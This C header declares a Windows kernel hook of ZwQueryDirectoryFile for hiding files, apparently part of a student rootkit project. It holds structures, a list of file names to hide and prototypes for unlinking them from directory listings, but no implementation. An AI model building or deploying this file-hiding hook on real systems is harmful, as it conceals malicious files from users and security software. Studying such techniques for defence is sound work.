/*
** File 	hide_file.h
** Author 	lucaze_b <alexis1.lucazeau@epitech.eu>
** Desc		Header file - ZwQueryDirectoryFile Hook
*/

#ifndef		HIDE_FILE_H__
# define	HIDE_FILE_H__

# define	FILENAME_OFFSET(_t) (ULONG) &(((_t) 0)->FileName)
# define	FILENAMESIZE_OFFSET(_t) (ULONG) &(((_t) 0)->FileNameLength)

typedef struct				s_fileInfoClassType
{
	FILE_INFORMATION_CLASS	fileInfoClass;
	ULONG					NameOffset;
	ULONG					NameSizeOffset;
}							t_fileInfoClassType;

typedef struct				s_fileToHide
{
	PWCHAR					fileName;
	struct s_fileToHide		*next;
}							t_fileToHide;

typedef NTSTATUS			(*pZwQueryDirectoryFile)(
	IN HANDLE FileHandle,
	IN HANDLE Event	OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG FileInformationLength,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileName OPTIONAL,
	IN BOOLEAN RestartScan
);

NTSYSAPI NTSTATUS NTAPI		ZwQueryDirectoryFile(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG FileInformationLength,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileName OPTIONAL,
	IN BOOLEAN RestartScan
);

NTSTATUS 					ZwQueryDirectoryFileHook(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG FileInformationLength,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileName OPTIONAL,
	IN BOOLEAN RestartScan
);

NTSTATUS	HideFile(
				IN PCHAR params);
NTSTATUS 	ZwQueryDirectoryFileHook(
				IN HANDLE FileHandle,
				IN HANDLE Event OPTIONAL,
				IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
				IN PVOID ApcContext OPTIONAL,
				OUT PIO_STATUS_BLOCK IoStatusBlock,
				OUT PVOID FileInformation,
				IN ULONG FileInformationLength,
				IN FILE_INFORMATION_CLASS FileInformationClass,
				IN BOOLEAN ReturnSingleEntry,
				IN PUNICODE_STRING FileName OPTIONAL,
				IN BOOLEAN RestartScan);
VOID		UnlinkFilesToHide(
				IN PVOID FileInformation,
				IN FILE_INFORMATION_CLASS FileInformationClass);
VOID		GetNameInfo(
				IN PVOID FileInformation,
				IN FILE_INFORMATION_CLASS FileInformationClass,
				OUT PULONG NameOffset,
				OUT PULONG NameSizeOffset);

#endif		/*! HIDE_FILE_H__ */
